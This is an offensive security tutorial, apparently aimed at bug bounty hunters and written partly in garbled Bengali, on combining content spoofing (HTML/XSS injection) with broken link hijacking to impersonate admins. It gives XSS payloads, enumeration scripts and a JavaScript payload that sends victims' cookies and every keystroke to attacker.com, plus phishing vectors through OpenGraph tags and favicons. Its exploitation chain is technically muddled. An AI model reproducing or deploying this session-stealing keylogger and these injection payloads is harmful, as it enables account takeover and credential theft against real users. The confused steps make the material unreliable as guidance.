Content Spoofing + Broken Link Hijacking (BLH) à¦–à§à¦à¦œà¦¤à§‡ user-controlled content rendering à¦†à¦° external resource loading à¦ focus à¦•à¦°à§‹à¥¤ à¦à¦‡ combo à¦Ÿà¦¾ impersonation à¦à¦° à¦œà¦¨à§à¦¯ powerfulà¥¤

ğŸ¯ Target Areas
1. Email templates (user-controlled fields)
2. Public profiles with external links/images
3. Share links, referral pages
4. Dynamic content: /profile/{user}, /post/{id}
5. OpenGraph meta tags, favicons

ğŸ” Step-by-Step Detection
Step 1: Content Spoofing Discovery
# User-controlled fields test à¦•à¦°à§‹
Name: <img src=x onerror=alert(1)>
Bio: "><script>alert(1)</script>
Website: javascript:alert(1)

# HTML injection points
GET /profile?name=<svg onload=alert(1)>
POST /update {"bio": "<img src=x onerror=alert(document.domain)>"}
Step 2: Broken Link Hijacking Setup



# Hijack common CDN/static resources
1. https://target.com/js/app.js â†’ 404? â†’ Upload evil.js
2. https://target.com/css/style.css â†’ 404? â†’ Upload phishing.css
3. https://target.com/images/logo.png â†’ 404? â†’ Upload fake-logo.png
4. https://target.com/favicon.ico â†’ 404?
ğŸ› ï¸ Testing Methodology
Burp Workflow



1. Spider â†’ à¦¸à¦¬ static assets enumerate à¦•à¦°à§‹
2. Engagement â†’ Broken link scanner
3. Repeater â†’ User input HTML injection test
4. Collaborator â†’ External resource loading track
Resource Enumeration
bash



# à¦¸à¦¬ common paths check à¦•à¦°à§‹
curl -I "https://target.com/{js/app.js,css/main.css,images/logo.png,favicon.ico}"

# Directory brute force (static assets)
ffuf -u https://target.com/FUZZ \
  -w /path/to/static-files.txt \
  -fc 200,301,302
ğŸ”¥ Exploitation Chain (Impersonation)

Step 1: BLH Setup
1. target.com/js/tracking.js â†’ 404 confirmed
2. Upload: evil.com/js/tracking.js (your control)
3. Content: phishing JS + pixel tracking

Step 2: Content Spoofing Trigger
Profile update:
Name: "Admin Team"
Bio: <script src="https://target.com/js/tracking.js"></script>
Website: https://target.com/profile/evil-user

Result: Victim à¦à¦° browser target.com à¦à¦° JS load à¦•à¦°à§‡ (trusted context)
Step 3: Impersonation Payload
html



<!-- evil.com/js/tracking.js -->
(function(){
  // Session steal
  fetch('https://attacker.com/steal?cookie='+document.cookie);
  
  // Keylogger
  document.addEventListener('keydown', e=> {
    fetch('https://attacker.com/log?key='+e.key);
  });
})();
ğŸ“‹ Proof of Concept Steps
1. Enumerate: target.com/js/analytics.js â†’ 404
2. Control: Upload to your domain as analytics.js
3. Injection: Update profile bio â†’ <script src="/js/analytics.js">
4. Victim visit: /profile/evil-user â†’ JS executes in target.com context
5. Impact: Session theft, keylogging, phishing

ğŸ§ª cURL + HTML Testing
bash
# BLH validation
curl -I "https://target.com/js/app.js" | grep "404"

# Content spoofing test
curl -X POST "https://target.com/profile/update" \
  -d 'bio=<img src="https://attacker.com/pixel.gif">' \
  -b "session=your_session"

ğŸ”„ Bypass + Advanced Vectors
1. OpenGraph Spoofing
<meta property="og:image" content="https://attacker.com/fake-admin-profile.jpg">
<meta property="og:title" content="Admin Login Required">
<meta property="og:description" content="Click here to verify">

2. Favicon Hijacking
<link rel="icon" href="https://target.com/favicon.ico">
â†’ 404 â†’ attacker.com/favicon.ico (phishing page)

3. CSS Background Images
<style>
.admin-profile { 
  background: url(https://attacker.com/phish.jpg);
}
</style>

ğŸ’¥ Impact Demonstration (Safe)
âœ… BLH: target.com/js/app.js â†’ 404 â†’ attacker.com/js/app.js
âœ… Spoofing: Profile bio accepts HTML/JS
âœ… PoC: <img src="https://collaborator.oastify.com/pixel.gif">
âœ… Hit: Collaborator callback confirmation
âœ… Scenario: Admin impersonation â†’ credential theft

ğŸš€ Automation Script
bash
#!/bin/bash
BLH_PATHS=(
  "js/app.js" "js/tracking.js" "css/style.css"
  "images/logo.png" "favicon.ico" "robots.txt"
)

for path in "${BLH_PATHS[@]}"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path")
  if [[ $status == "404" ]]; then
    echo "[+] BLH Candidate: https://target.com/$path"
  fi
done

âš ï¸ Report Template
Title: Content Spoofing + BLH â†’ Admin Impersonation
CWE: CWE-79 (XSS) + CWE-829 (Inclusion of Functionality)
CVSS: 8.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
PoC: [Video: Victim clicks profile â†’ collaborator hit]
Key Insight: Public profile à¦¯à§‡à¦–à¦¾à¦¨à§‡ bio/website field à¦†à¦›à§‡ + static asset 404 = instant BLH opportunityà¥¤ Email notification features à¦šà§‡à¦• à¦•à¦°à§‹ priorityà¥¤
